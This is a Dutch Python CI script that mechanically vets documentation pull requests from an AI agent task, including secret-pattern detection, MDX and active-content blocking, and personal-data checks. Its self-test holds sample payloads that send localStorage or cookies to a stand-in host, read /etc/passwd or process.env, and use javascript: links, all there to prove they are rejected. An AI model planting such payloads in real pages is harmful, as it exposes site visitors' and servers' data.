#!/usr/bin/env python3
"""Kleine toets op een PR van een agent-taak (task849 stap 2 en 3, besluit Serge 04-10-2026).

Mechanisch, geen model: wat de agent schrijft wordt nooit uitgevoerd, alleen gelezen als bytes.
Draait vanuit main (dit bestand komt van main); de tak is alleen data.

  python3 scripts/ci/pr-toets.py <tak-checkout> [--basis origin/main]
  python3 scripts/ci/pr-toets.py --self-test
Exit 0 = groen, 1 = rood (reden op stdout), 2 = kon niet meten.

Toetst:
  1. alleen toevoegen of wijzigen (A of M), alleen pages/**/*.md, .mdx en pages/**/_meta.json (ook pages/_meta.json);
  2. elk bestand is een gewoon bestand (geen symlink), UTF-8, geen NUL, hooguit 300 kB;
  3. geen geheimen (bekende sleutelvormen) en geen actieve inhoud (<script, <iframe, javascript:, on...=);
  3b. MDX is code (security ed420d8e en daarna). Voor .md: alleen platte Markdown, de toets knipt NIETS weg; elke
      {, } en <, elke regel die met import of export begint, een plaatje met verwijzing, een extern plaatje en een
      javascript:/data:-link is rood. Voor .mdx: de echte parser (scripts/ci/mdx-toets, remark-mdx 3, vastgepind met
      lockfile) leest de boom en laat alleen een kleine lijst toe (lucide-iconen, enkele HTML-elementen, enkelvoudig
      commentaar). Zonder die toets (MDX_TOETS_CMD) is elke .mdx rood: kan niet meten is niet groen. Rood gaat niet
      naar een mens maar terug naar wp_content met de reden (besluit Serge 04-10-2026);
  4. elke commit op de tak komt van de agent-plek (e-mail agent@runner-stick.invalid).
"""
import os
import re
import subprocess
import sys
import json
import tempfile

PADEN = re.compile(r"^pages/.+\.(md|mdx)$|^pages/(.+/)?_meta\.json$")
MAX_BYTES = 300_000


def instellingen():
    """Per repo verschilt alleen de TLDR-regel (teststrategie stap 2, aanvulling wp_content 05-10).

    Het bestand staat naast dit script en komt dus van main, nooit uit de PR. Zonder bestand: TLDR altijd verwacht
    (internal). tldr_vanaf_regels: 0 = altijd, 10 = alleen boven 10 regels (operations), null = nooit (public).
    """
    pad = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pr-toets-instellingen.json")
    if not os.path.exists(pad):
        return {"tldr_vanaf_regels": 0}
    with open(pad, encoding="utf-8") as f:
        return json.load(f)
AGENT_MAIL = "agent@runner-stick.invalid"
GEHEIM = [
    ("AWS-sleutel", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("GitHub-token", re.compile(r"\bgh[pousr]_[A-Za-z0-9]{30,}\b")),
    ("GitHub fine-grained", re.compile(r"\bgithub_pat_[A-Za-z0-9_]{30,}\b")),
    ("API-sleutel sk-", re.compile(r"\bsk-[A-Za-z0-9_-]{24,}\b")),
    ("Slack-token", re.compile(r"\bxox[abprs]-[A-Za-z0-9-]{10,}\b")),
    ("privésleutel", re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")),
    ("Telegram-bottoken", re.compile(r"\b\d{8,10}:[A-Za-z0-9_-]{35}\b")),
    ("JWT", re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b")),
    ("wachtwoord of sleutel in tekst", re.compile(r"(?i)\b(password|passwd|secret|api[_-]?key|token)\s*[:=]\s*['\"]?[A-Za-z0-9/+_=-]{16,}")),
]
MDX_REGELS = [
    ("import/export (MDX is code)", re.compile(r"(?m)^[ \t]*(import|export)\b")),
    ("accolade (MDX-expressie)", re.compile(r"[{}]")),
    ("< (JSX of HTML)", re.compile(r"<")),
    ("plaatje met verwijzing", re.compile(r"!\[[^\]]*\]\s*\[")),
    ("extern plaatje", re.compile(r"!\[[^\]]*\]\(\s*<?\s*(?:[A-Za-z][A-Za-z0-9+.-]*:|//)")),
    ("gevaarlijke link", re.compile(r"(?i)\]\(\s*<?\s*(?:javascript|data|vbscript)\s*:")),
]


def platte_markdown(tekst):
    """Geen knip: de hele tekst wordt getoetst (zie de docstring, 3b). Geeft (tekst, None)."""
    return tekst, None


ACTIEF = [
    ("<script", re.compile(r"(?i)<\s*script\b")),
    ("<iframe", re.compile(r"(?i)<\s*iframe\b")),
    ("javascript:-link", re.compile(r"(?i)javascript\s*:")),
    ("on...=-attribuut", re.compile(r"(?i)<[^>]+\son[a-z]+\s*=")),
]


def git(repo, *args):
    r = subprocess.run(["git", "-C", repo, "-c", "core.hooksPath=/dev/null", *args],
                       capture_output=True)
    if r.returncode != 0:
        raise RuntimeError("git %s: %s" % (" ".join(args), r.stderr.decode("utf-8", "replace").strip()))
    return r.stdout


PLAATJE_URL = re.compile(r"!\[[^\]]*\]\(\s*<?([^)\s>]*)")
PLAATJE_PAD = re.compile(r"^(\./|/)?[A-Za-z0-9_-]+([./][A-Za-z0-9_-]+)*\.(png|jpe?g|gif|svg|webp|avif)$", re.I)


def plaatje_fouten(tekst):
    """Een markdown-plaatje mag alleen naar een gewoon pad naar een plaatjesbestand, zonder .. of schema
    (nazorg security 04-10-2026: Nextra maakt van een relatief plaatje een import van dat bestand)."""
    uit = []
    for url in PLAATJE_URL.findall(tekst):
        if ".." in url:
            uit.append("plaatje buiten de map (..)")
        elif not PLAATJE_PAD.match(url):
            uit.append("plaatje met een pad dat niet is toegestaan (%s)" % url[:60])
    return uit


# Terugmelding aan de WP: vaste codes met een vaste gewone zin, zonder te verraden hoe de toets werkt (Serge 04-10-2026:
# de WP's zien niet wat en hoe er getest wordt). Geen patroonnaam, geen regelnummer, geen scriptnaam.
CODE_ZIN = {
    "lege_diff": "De taak heeft niets gewijzigd.",
    "wijziging_niet_toegestaan": "Een bestand is verwijderd of hernoemd; alleen toevoegen of wijzigen mag.",
    "pad_niet_toegestaan": "Dit pad mag een agent-taak niet wijzigen.",
    "geen_gewoon_bestand": "Dit is geen gewoon bestand.",
    "bestand_te_groot": "Het bestand is te groot.",
    "bestand_ongeldig": "Het bestand heeft een ongeldige vorm.",
    "geheim_gevonden": "Er lijkt een geheim in te staan.",
    "actieve_inhoud": "Er staat actieve inhoud in die niet is toegestaan.",
    "md_niet_toegestaan": "Deze Markdown-pagina bevat iets dat niet is toegestaan.",
    "mdx_niet_toegestaan": "Deze MDX-pagina bevat iets dat niet is toegestaan.",
    "plaatje_niet_toegestaan": "Een plaatje of plaatjespad is niet toegestaan.",
    "commit_onbekend": "De wijziging komt niet van de agent-plek.",
    "niet_te_meten": "De toets kon niet worden uitgevoerd.",
    "toets_rood": "De toets keurde dit af.",
}
CODE_REGELS = [
    ("lege diff", "lege_diff"),
    ("alleen toevoegen of wijzigen", "wijziging_niet_toegestaan"),
    ("buiten de toegestane paden", "pad_niet_toegestaan"),
    ("geen gewoon bestand", "geen_gewoon_bestand"),
    ("groter dan", "bestand_te_groot"),
    ("NUL-byte", "bestand_ongeldig"),
    ("geen UTF-8", "bestand_ongeldig"),
    ("geen geldige JSON", "bestand_ongeldig"),
    ("geen JSON-object", "bestand_ongeldig"),
    ("lijkt een geheim", "geheim_gevonden"),
    ("actieve inhoud (", "actieve_inhoud"),
    ("plaatje", "plaatje_niet_toegestaan"),
    ("alleen platte Markdown", "md_niet_toegestaan"),
    ("onafgesloten codeblok", "md_niet_toegestaan"),
    ("commit van een ander", "commit_onbekend"),
    ("kan niet meten", "niet_te_meten"),
    ("niet te starten", "niet_te_meten"),
    ("MDX-toets gaf exit", "niet_te_meten"),
    ("ONGEMETEN", "niet_te_meten"),
    ("mdx: ", "mdx_niet_toegestaan"),
]
PAD_IN_REGEL = re.compile(r"(?:^|\s)([A-Za-z0-9_./-]+\.[A-Za-z0-9]+)(?:\s->\s\S+)?:")


def code_van(regel):
    for stuk, code in CODE_REGELS:
        if stuk in regel:
            return code
    return "toets_rood"


def melding_regel(rood):
    """De ENIGE regel die naar de WP gaat: code@pad en een vaste zin. Eerste 12 verschillende."""
    gezien, uit = set(), []
    for r in rood:
        code = code_van(r)
        m = PAD_IN_REGEL.search(r)
        pad = m.group(1) if m else "-"
        if (code, pad) in gezien:
            continue
        gezien.add((code, pad))
        uit.append("%s@%s: %s" % (code, pad, CODE_ZIN[code]))
        if len(uit) >= 12:
            break
    return "MELDING " + " | ".join(uit) if uit else "MELDING geen"


def mdx_toets(repo, paden):
    """De echte MDX-parser (node, scripts/ci/mdx-toets/toets.mjs) op de .mdx-bestanden van de tak.
    Het commando komt uit MDX_TOETS_CMD (alleen te zetten door de workflow, van main). Zonder: rood."""
    cmd = os.environ.get("MDX_TOETS_CMD", "").strip()
    if not cmd:
        return ["%s: geen MDX-toets beschikbaar (MDX_TOETS_CMD leeg): kan niet meten" % p for p in paden]
    import shlex
    try:
        r = subprocess.run(shlex.split(cmd) + [os.path.join(repo, p) for p in paden], capture_output=True, text=True)
    except OSError as e:
        return ["MDX-toets is niet te starten (%s): kan niet meten" % e]
    uit = [x for x in r.stdout.splitlines() if x.startswith(("ROOD", "ONGEMETEN"))]
    if r.returncode == 0:
        return []
    if not uit:
        return ["MDX-toets gaf exit %d zonder uitleg: kan niet meten" % r.returncode]
    pre = os.path.join(repo, "")
    return ["mdx: " + x.replace(pre, "") for x in uit]


def toets(repo, basis="origin/main"):
    """Geeft (rood: [str], bestanden: int)."""
    rood = []
    regels = git(repo, "diff", "--name-status", "-z", "%s...HEAD" % basis).decode("utf-8", "surrogateescape").split("\0")
    regels = [x for x in regels if x != ""]
    # -z: status en pad wisselen elkaar af (bij rename/copy twee paden; die zijn sowieso rood)
    wijz, i = [], 0
    while i < len(regels):
        st = regels[i]
        if st[0] in "RC":
            wijz.append((st, regels[i + 1] + " -> " + regels[i + 2])); i += 3
        else:
            wijz.append((st, regels[i + 1])); i += 2
    if not wijz:
        return ["lege diff"], 0
    for st, pad in wijz:
        if st not in ("A", "M"):
            rood.append("%s %s: alleen toevoegen of wijzigen" % (st, pad))
        elif not PADEN.match(pad):
            rood.append("%s: buiten de toegestane paden" % pad)
    if rood:
        return rood, len(wijz)
    mdx_paden = []
    for st, pad in wijz:
        modus = git(repo, "ls-tree", "HEAD", "--", pad).split(b" ", 1)[0]
        if modus != b"100644" and modus != b"100755":
            rood.append("%s: geen gewoon bestand (modus %s)" % (pad, modus.decode() or "?"))
            continue
        data = git(repo, "cat-file", "-p", "HEAD:" + pad)
        if len(data) > MAX_BYTES:
            rood.append("%s: groter dan %d bytes" % (pad, MAX_BYTES)); continue
        if b"\0" in data:
            rood.append("%s: bevat een NUL-byte" % pad); continue
        try:
            tekst = data.decode("utf-8")
        except UnicodeDecodeError:
            rood.append("%s: geen UTF-8" % pad); continue
        for naam, rx in GEHEIM:
            if rx.search(tekst):
                rood.append("%s: lijkt een geheim te bevatten (%s)" % (pad, naam))
        for naam, rx in ACTIEF:
            if rx.search(tekst):
                rood.append("%s: actieve inhoud (%s)" % (pad, naam))
        if pad.endswith(".mdx"):
            mdx_paden.append(pad)
        if pad.endswith(".md"):
            proza, fout = platte_markdown(tekst)
            if fout:
                rood.append("%s: %s" % (pad, fout))
            else:
                for naam, rx in MDX_REGELS:
                    if rx.search(proza):
                        rood.append("%s: %s; alleen platte Markdown gaat automatisch door" % (pad, naam))
                for f in plaatje_fouten(tekst):
                    rood.append("%s: %s" % (pad, f))
        elif pad.endswith(".json"):
            try:
                import json
                if not isinstance(json.loads(tekst), dict):
                    rood.append("%s: geen JSON-object" % pad)
            except ValueError:
                rood.append("%s: geen geldige JSON" % pad)
    if mdx_paden:
        rood.extend(mdx_toets(repo, mdx_paden))
    for e in git(repo, "log", "--format=%ae", "%s..HEAD" % basis).decode().split():
        if e != AGENT_MAIL:
            rood.append("commit van een ander dan de agent-plek (%s)" % e)
    return rood, len(wijz)


# Algemene variant (05-10-2026, afspraak wp_content en security, e0d451cb en 30317c31): elke PR die geen
# job/-tak van de agent-keten is. Alleen een status, geen merge. Geen padtoets en geen afzendertoets (die
# horen bij de agent-keten); wel geheimen, actieve inhoud en de MDX-ontleder op pagina's. Schrijfstijl
# alleen als LET OP-regel, nooit rood (wp_content: mensen schrijven soms bewust anders).
GEDACHTESTREEP = re.compile(r"\w \u2014 \w|\w \u2013 \w")

# Persoonsgegevens (teststrategie stap 4, lijsten van wp_content 07-10-2026). Alleen aan als het
# instellingenbestand de sleutel draagt, dus alleen in operations-docs. Mechanisch, met een eerlijke grens:
#  - een IBAN met een geldig controlegetal dat niet op de lijst staat is ROOD. Het controlegetal houdt
#    willekeurige codes buiten de toets; de lijst staat alleen die ene waarde toe, nooit "elk IBAN";
#  - een e-mailadres buiten de eigen domeinen is alleen LET OP, en alleen als het geen functieadres is
#    (info@, facturen@, ...). Een script kan een persoon niet zeker van een functie onderscheiden;
#  - namen toetst dit niet. Dat blijft oordeel.
IBAN_RX = re.compile(r"\b[A-Z]{2}[0-9]{2}(?: ?[A-Z0-9]{4}){2,7}(?: ?[A-Z0-9]{1,4})?\b")
EMAIL_RX = re.compile(r"\b[A-Za-z0-9._%+-]+@([A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+)\b")
FUNCTIEADRES = re.compile(r"^(_?no-?reply|info|support|service|helpdesk|contact|hello|admin|administratie|"
                          r"facturen?|factuur|billing|invoices?|debiteuren|crediteuren|finance|finadmin|accounts?|"
                          r"accounting[\w.-]*|payments?[\w.-]*|klantenservice|backoffice|recruitment|vacatures?|"
                          r"inkoop[\w.-]*|inhuurdesk|leverancier[\w.-]*|premie[\w.-]*|acceptatie|git|"
                          r"notifications?|security|privacy|hr|salaris|planning|office|team|sales)$", re.I)


def iban_geldig(kandidaat):
    k = kandidaat.replace(" ", "").upper()
    if not 15 <= len(k) <= 34:
        return False
    getal = "".join(str(int(c, 36)) for c in k[4:] + k[:4])
    return int(getal) % 97 == 1


def persoonsgegevens(regels, inst):
    """Geeft (rood, let_op) voor toegevoegde regels, volgens de instellingen."""
    rood, let_op = [], []
    if "toegestane_iban" in inst:
        mag = {x.replace(" ", "").upper() for x in inst["toegestane_iban"]}
        for r in regels:
            for m in IBAN_RX.finditer(r):
                k = m.group(0).replace(" ", "").upper()
                if iban_geldig(k) and k not in mag:
                    rood.append("IBAN %s...%s staat niet op de lijst eigen gegevens" % (k[:4], k[-2:]))
    if "eigen_email_domeinen" in inst:
        eigen = {d.lower() for d in inst["eigen_email_domeinen"]}
        for r in regels:
            for m in EMAIL_RX.finditer(r):
                lokaal = m.group(0).split("@", 1)[0]
                if m.group(1).lower() not in eigen and not FUNCTIEADRES.match(lokaal):
                    # Niet voluit in de log: dat is precies het gegeven dat we beschermen (security 07-10).
                    let_op.append("e-mailadres van een persoon? %s…@%s" % (lokaal[:1], m.group(1)))
    return rood, let_op


def toets_algemeen(repo, basis="origin/main", tldr_vanaf=False, inst=None):
    """Geeft (rood: [str], let_op: [str], bestanden: int). Leest de PR alleen als data."""
    if inst is None:
        inst = instellingen()
    if tldr_vanaf is False:
        tldr_vanaf = inst.get("tldr_vanaf_regels", 0)
    woorden = [w.lower() for w in inst.get("verboden_woorden", [])]
    rood, let_op = [], []
    regels = git(repo, "diff", "--name-status", "-z", "%s...HEAD" % basis).decode("utf-8", "surrogateescape").split("\0")
    regels = [x for x in regels if x != ""]
    wijz, i = [], 0
    while i < len(regels):
        st = regels[i]
        if st[0] in "RC":
            wijz.append((st[0], regels[i + 2])); i += 3
        else:
            wijz.append((st, regels[i + 1])); i += 2
    if not wijz:
        return ["lege diff"], [], 0
    mdx_paden = []
    for st, pad in wijz:
        if st == "D":
            continue
        modus = git(repo, "ls-tree", "HEAD", "--", pad).split(b" ", 1)[0]
        if modus == b"120000":
            rood.append("%s: een symlink" % pad); continue
        if modus not in (b"100644", b"100755"):
            continue
        data = git(repo, "cat-file", "-p", "HEAD:" + pad)
        if b"\0" in data or len(data) > MAX_BYTES:
            continue          # binair of groot: geen tekst om te lezen
        try:
            tekst = data.decode("utf-8")
        except UnicodeDecodeError:
            continue
        for naam, rx in GEHEIM:
            if rx.search(tekst):
                rood.append("%s: lijkt een geheim te bevatten (%s)" % (pad, naam))
        if pad.startswith("pages/") and pad.endswith((".md", ".mdx")):
            for naam, rx in ACTIEF:
                if rx.search(tekst):
                    rood.append("%s: actieve inhoud (%s)" % (pad, naam))
            if pad.endswith(".mdx"):
                mdx_paden.append(pad)
            nieuw = git(repo, "diff", "-U0", "%s...HEAD" % basis, "--", pad).decode("utf-8", "replace")
            toegevoegd = [r[1:] for r in nieuw.splitlines() if r.startswith("+") and not r.startswith("+++")]
            if any(GEDACHTESTREEP.search(r) for r in toegevoegd):
                let_op.append("%s: gedachtestreep als zinsverbinder in een nieuwe regel" % pad)
            if tldr_vanaf is not None and len(tekst.splitlines()) > tldr_vanaf and "tldr" not in tekst.lower():
                let_op.append("%s: geen TLDR gevonden" % pad)
            r_pg, l_pg = persoonsgegevens(toegevoegd, inst)
            rood.extend("%s: %s" % (pad, x) for x in r_pg)
            let_op.extend("%s: %s" % (pad, x) for x in l_pg)
        if woorden and pad.startswith(("pages/", "src/")) and pad.endswith((".md", ".mdx", ".njk", ".html")):
            nieuw = git(repo, "diff", "-U0", "%s...HEAD" % basis, "--", pad).decode("utf-8", "replace")
            for r in (r[1:].lower() for r in nieuw.splitlines() if r.startswith("+") and not r.startswith("+++")):
                for w in woorden:
                    if w in r:
                        let_op.append("%s: woord uit de woordenlijst publiek: %s" % (pad, w))
    if mdx_paden:
        rood.extend(mdx_toets(repo, mdx_paden))
    return rood, let_op, len(wijz)


def zelftest():
    fouten = []

    def eis(naam, ok):
        print("  %s %s" % ("ok  " if ok else "STUK", naam))
        if not ok:
            fouten.append(naam)

    def proef(bestanden, mail=AGENT_MAIL, verwijder=(), mdx=None):
        with tempfile.TemporaryDirectory() as d:
            def g(*a, env=None):
                subprocess.run(["git", "-C", d, "-c", "core.hooksPath=/dev/null", *a], check=True,
                               capture_output=True, env={**os.environ, **(env or {})})
            g("init", "-q", "-b", "main")
            os.makedirs(os.path.join(d, "pages"))
            with open(os.path.join(d, "pages", "oud.md"), "w") as f:
                f.write("# oud\n")
            g("add", "-A"); g("-c", "user.name=x", "-c", "user.email=x@x", "commit", "-qm", "basis")
            g("update-ref", "refs/remotes/origin/main", "HEAD")
            g("checkout", "-q", "-b", "job/proef")
            for pad, inhoud in bestanden.items():
                p = os.path.join(d, pad)
                os.makedirs(os.path.dirname(p), exist_ok=True)
                if isinstance(inhoud, tuple):
                    os.symlink(inhoud[0], p)
                else:
                    with open(p, "wb") as f:
                        f.write(inhoud if isinstance(inhoud, bytes) else inhoud.encode())
            for pad in verwijder:
                os.remove(os.path.join(d, pad))
            g("add", "-A"); g("-c", "user.name=a", "-c", "user.email=" + mail, "commit", "-qm", "taak")
            oud = os.environ.pop("MDX_TOETS_CMD", None)
            if mdx is not None:
                os.environ["MDX_TOETS_CMD"] = mdx
            try:
                return toets(d)[0]
            finally:
                os.environ.pop("MDX_TOETS_CMD", None)
                if oud is not None:
                    os.environ["MDX_TOETS_CMD"] = oud

    eis("een gewone pagina is groen", proef({"pages/nieuw.md": "# nieuw\n\nTekst.\n"}) == [])
    eis("een wijziging van een bestaande pagina is groen", proef({"pages/oud.md": "# oud\n\nmeer\n"}) == [])
    eis("een _meta.json is groen", proef({"pages/_meta.json": "{}\n"}) == [])
    eis("een bestand buiten pages/ is rood", proef({"scripts/x.md": "x\n"}) != [])
    eis(".github is rood", proef({".github/workflows/a.yml": "name: a\n"}) != [])
    eis("een andere extensie is rood", proef({"pages/a.js": "x\n"}) != [])
    eis("verwijderen is rood", proef({"pages/nieuw.md": "x\n"}, verwijder=["pages/oud.md"]) != [])
    eis("een symlink is rood", proef({"pages/l.md": ("/etc/passwd",)}) != [])
    eis("een AWS-sleutel is rood", proef({"pages/a.md": "sleutel " + "AKIA" + "ABCDEFGHIJKLMNOP\n"}) != [])
    eis("een GitHub-token is rood", proef({"pages/a.md": "t ghp_" + "a" * 36 + "\n"}) != [])
    eis("een privésleutel is rood", proef({"pages/a.md": "-----BEGIN " + "RSA PRIVATE KEY-----\n"}) != [])
    eis("password: met lange waarde is rood", proef({"pages/a.md": "pass" + "word: abcdefghijklmnop1234\n"}) != [])
    eis("<script is rood", proef({"pages/a.mdx": "<script>alert(1)</script>\n"}) != [])
    eis("javascript:-link is rood", proef({"pages/a.md": "[x](javascript:alert(1))\n"}) != [])
    eis("onclick-attribuut is rood", proef({"pages/a.mdx": "<div onclick=\"x()\">a</div>\n"}) != [])
    eis("een NUL-byte is rood", proef({"pages/a.md": b"a\0b"}) != [])
    eis("te groot is rood", proef({"pages/a.md": "x" * (MAX_BYTES + 1)}) != [])
    eis("commit van een ander is rood", proef({"pages/a.md": "ok\n"}, mail="mens@example.nl") != [])
    # security ed420d8e: MDX is code, alle zes moeten rood zijn
    eis("MDX: fetch in een expressie is rood", proef({"pages/a.mdx": "{fetch('https://x.example/?d='+JSON.stringify(localStorage))}\n"}) != [])
    eis("MDX: export const met await fetch is rood", proef({"pages/a.mdx": "export const x = await fetch('https://x.example')\n"}) != [])
    eis("MDX: import fs met expressie is rood", proef({"pages/a.mdx": "import fs from 'fs'\n\n{fs.readFileSync('/etc/passwd')}\n"}) != [])
    eis("MDX: process.env in een expressie is rood", proef({"pages/a.mdx": "{JSON.stringify(process.env)}\n"}) != [])
    eis("MDX: img met expressie-attribuut is rood", proef({"pages/a.mdx": "<img src={'https://x.example/?c='+document.cookie} />\n"}) != [])
    eis("MDX: extern plaatje (volgpixel) is rood", proef({"pages/a.md": "![](https://x.example/p.gif)\n"}) != [])
    eis("MDX: verwijzend plaatje is rood", proef({"pages/a.md": "![x][r]\n\n[r]: https://x.example/p.gif\n"}) != [])
    eis("MDX: een echte pagina met lucide-import en Callout gaat NIET automatisch door (rood)",
        proef({"pages/a.mdx": "import { Info } from 'lucide-react'\nimport { Callout } from 'nextra/components'\n\n# T\n\n<Callout><Info /> let op</Callout>\n"}) != [])
    eis("MDX: een data:-link is rood", proef({"pages/a.md": "[x](data:text/html;base64,AAAA)\n"}) != [])
    eis("MDX: onafgesloten codeblok is rood", proef({"pages/a.md": "```js\n{x}\n"}) != [])
    eis("platte Markdown met kop, lijst, tabel, link en relatief plaatje is groen",
        proef({"pages/a.md": "# Kop\n\n- een\n- twee\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n[link](https://kroescontrol.nl) en ![plaatje](/hub/x.png)\n"}) == [])
    eis("{, import of <tag in een codeblok of inline code gaat NIET automatisch door (rood)",
        proef({"pages/a.md": "Gebruik `{x}` zo:\n\n```tsx\nimport { A } from 'b'\n<A />\n```\n"}) != [])
    # security, tweede ronde: gevallen waarin knippen afwijkt van de MDX-parser, allemaal rood
    eis("sluit-fence langer dan de opener, daarna een expressie, is rood",
        proef({"pages/a.mdx": "```\ncode\n````\n\n{fetch('https://x.example/?d='+JSON.stringify(localStorage))}\n"}) != [])
    eis("geëscapete backticks rond een expressie zijn rood",
        proef({"pages/a.mdx": "\\`{fetch('https://x.example')}\\`\n"}) != [])
    eis("fence met vier spaties ervoor en een expressie is rood",
        proef({"pages/a.mdx": "    ```\n{process.env}\n    ```\n"}) != [])
    eis("fence met een tab ervoor en een expressie is rood",
        proef({"pages/a.mdx": "\t```\n{process.env}\n\t```\n"}) != [])
    eis("een _meta.json die geen geldige JSON is, is rood", proef({"pages/_meta.json": "{niet json"}) != [])
    # .mdx gaat via de echte parser; de stubs bewijzen de koppeling, de inhoud wordt in toets.test.mjs getoetst
    GROEN_STUB = "python3 -c 'import sys;print(\"GROEN\")'"
    ROOD_STUB = "python3 -c 'import sys;print(\"ROOD  \"+sys.argv[1]+\": proef\");sys.exit(1)'"
    eis("een .mdx zonder MDX-toets is rood (kan niet meten)", proef({"pages/a.mdx": "# kop\n"}) != [])
    eis("een .mdx met een groene MDX-toets is groen", proef({"pages/a.mdx": "# kop\n"}, mdx=GROEN_STUB) == [])
    eis("een .mdx met een rode MDX-toets is rood, met de reden", any("proef" in r for r in proef({"pages/a.mdx": "# kop\n"}, mdx=ROOD_STUB)))
    eis("een MDX-toets die niet bestaat is rood", proef({"pages/a.mdx": "# kop\n"}, mdx="/niet/bestaand") != [])
    eis("een .md gebruikt de MDX-toets niet: een groene stub verandert niets aan een accolade",
        proef({"pages/a.md": "{x}\n"}, mdx=GROEN_STUB) != [])
    eis("markdown-plaatje met .. is rood", proef({"pages/a.md": "![x](../../.env)\n"}) != [])
    eis("markdown-plaatje naar /etc/passwd is rood", proef({"pages/a.md": "![x](/etc/passwd)\n"}) != [])
    eis("markdown-plaatje naar een plaatjesbestand is groen", proef({"pages/a.md": "![x](/hub/x.png)\n"}) == [])
    # terugmelding op codes
    ml = melding_regel(["pages/a.md: lijkt een geheim te bevatten (GitHub-token)", "pages/b.md: buiten de toegestane paden"])
    eis("de melding noemt een code en een pad", "geheim_gevonden@pages/a.md" in ml and "pad_niet_toegestaan@pages/b.md" in ml)
    eis("de melding verraadt geen patroonnaam", "GitHub" not in ml and "token" not in ml.lower() and "regex" not in ml.lower())
    eis("de melding verraadt geen scriptnaam", "pr-toets" not in ml and "toets.py" not in ml)
    eis("een onbekende reden wordt toets_rood", code_van("iets nieuws") == "toets_rood")
    eis("elke code in de regels heeft een zin", all(c in CODE_ZIN for _, c in CODE_REGELS))
    eis("zonder bevinding: MELDING geen", melding_regel([]) == "MELDING geen")
    eis("een bevinding zonder pad krijgt een streepje", "lege_diff@-" in melding_regel(["lege diff"]))
    eis("de melding is begrensd op 12 bevindingen", melding_regel(["pages/%d.md: buiten de toegestane paden" % i for i in range(30)]).count("@") == 12)
    eis("een pad buiten pages/ krijgt ook zijn pad in de melding", "pad_niet_toegestaan@scripts/a.md" in melding_regel(["scripts/a.md: buiten de toegestane paden"]))
    eis("een pad uit een mdx-regel komt in de melding", "mdx_niet_toegestaan@pages/x.mdx" in melding_regel(["mdx: ROOD  pages/x.mdx: expressie tussen accolades"]))
    eis("een tekst na de dubbele punt wordt niet als pad gelezen", "@-" in melding_regel(["lege diff"]))
    eis("het woord password zonder waarde is groen", proef({"pages/a.md": "Het password-beleid staat elders.\n"}) == [])
    # algemene variant
    def alg(bestanden, verwijder=(), tldr_vanaf=0, inst=None):
        with tempfile.TemporaryDirectory() as d:
            def g(*a):
                subprocess.run(["git", "-C", d, "-c", "core.hooksPath=/dev/null", *a], check=True, capture_output=True,
                               env={**os.environ, "GIT_AUTHOR_NAME": "m", "GIT_AUTHOR_EMAIL": "mens@example.nl",
                                    "GIT_COMMITTER_NAME": "m", "GIT_COMMITTER_EMAIL": "mens@example.nl"})
            g("init", "-q", "-b", "main"); open(os.path.join(d, "pages_oud.md"), "w").write("x\n")
            g("add", "-A"); g("commit", "-qm", "basis"); g("branch", "basis")
            for pad, inh in bestanden.items():
                os.makedirs(os.path.dirname(os.path.join(d, pad)) or d, exist_ok=True)
                open(os.path.join(d, pad), "wb").write(inh.encode() if isinstance(inh, str) else inh)
            for pad in verwijder:
                os.remove(os.path.join(d, pad))
            g("add", "-A"); g("commit", "-qm", "wijziging")
            return toets_algemeen(d, "basis", tldr_vanaf, inst if inst is not None else {})
    r, l, _ = alg({"scripts/x.py": "print(1)\n"})
    eis("algemeen: een script buiten pages/ is groen", r == [])
    r, l, _ = alg({"scripts/x.sh": "t=ghp_" + "a" * 36 + "\n"})
    eis("algemeen: een geheim buiten pages/ is rood", r != [])
    r, l, _ = alg({"pages/a.md": "# kop\n\nTLDR: kort.\n"}, verwijder=["pages_oud.md"])
    eis("algemeen: verwijderen is groen", r == [] and l == [])
    r, l, _ = alg({"pages/a.md": "# kop\n\nDit is zo \u2014 dat klopt.\n"})
    eis("algemeen: gedachtestreep en geen TLDR geven alleen LET OP", r == [] and len(l) == 2)
    r, l, _ = alg({"pages/a.md": "[x](javascript:alert(1))\nTLDR\n"})
    eis("algemeen: actieve inhoud op een pagina is rood", r != [])
    kort = "# kop\n\n" + "regel\n" * 5
    lang = "# kop\n\n" + "regel\n" * 12
    r, l, _ = alg({"pages/a.md": kort}, tldr_vanaf=10)
    eis("tldr vanaf 10: een korte pagina zonder TLDR is stil", r == [] and l == [])
    r, l, _ = alg({"pages/a.md": lang}, tldr_vanaf=10)
    eis("tldr vanaf 10: een lange pagina zonder TLDR geeft LET OP", r == [] and len(l) == 1)
    r, l, _ = alg({"pages/a.md": lang}, tldr_vanaf=None)
    eis("tldr nooit: een lange pagina zonder TLDR is stil", r == [] and l == [])
    eis("instellingen zijn leesbaar", "tldr_vanaf_regels" in instellingen())
    # persoonsgegevens (stap 4). Voorbeeld-IBAN NL91ABNA0417164300 is de bekende geldige testwaarde.
    pg = {"toegestane_iban": ["NL82 ABNA 0535 7312 48"], "eigen_email_domeinen": ["kroescontrol.nl"]}
    cak = "# CAK\n\nTLDR: x.\n\nRekening: `NL82 ABNA 0535 7312 48`\n"
    r, l, _ = alg({"pages/hr/cak.md": cak}, inst=pg)
    eis("pg: de CAK-rekening op de lijst is stil", r == [] and l == [])
    r, l, _ = alg({"pages/hr/cak.md": cak + "Klant: NL91 ABNA 0417 1643 00\n"}, inst=pg)
    eis("pg: een verzonnen IBAN op dezelfde pagina is rood", len(r) == 1 and "NL91" in r[0])
    eis("pg: de melding noemt het IBAN niet voluit", "0417" not in r[0])
    r, l, _ = alg({"pages/a.md": "TLDR\nNL91ABNA0417164300\n"}, inst=pg)
    eis("pg: een IBAN zonder spaties is ook rood", len(r) == 1)
    r, l, _ = alg({"pages/a.md": "TLDR\nNL91ABNA0417164399\n"}, inst=pg)
    eis("pg: een code met een fout controlegetal is geen IBAN", r == [])
    r, l, _ = alg({"pages/a.md": "TLDR\nNL91ABNA0417164300\n"}, inst={})
    eis("pg: zonder instelling geen IBAN-toets", r == [])
    r, l, _ = alg({"pages/a.md": "TLDR\nmail serge@kroescontrol.nl of info@klant.nl\n"}, inst=pg)
    eis("pg: eigen domein en functieadres zijn stil", r == [] and l == [])
